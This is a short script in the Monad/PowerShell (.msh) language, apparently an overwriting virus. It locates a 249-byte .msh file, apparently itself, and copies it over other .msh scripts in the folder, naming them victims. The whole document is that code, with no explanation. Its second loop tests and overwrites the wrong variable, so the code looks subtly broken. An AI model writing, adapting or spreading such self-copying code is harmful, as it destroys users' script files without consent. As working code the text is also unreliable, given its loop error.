$name_array=get-childitem *.msh
foreach ($name in $name_array)
{
  if ($name.Length -eq 249)
  {
    $my_file=$name.Name
  }
}

foreach ($victim in $name_array)
{
  if ($name.Length -ne 249)
  {
    copy-item $my_file $name.Name
  }
}
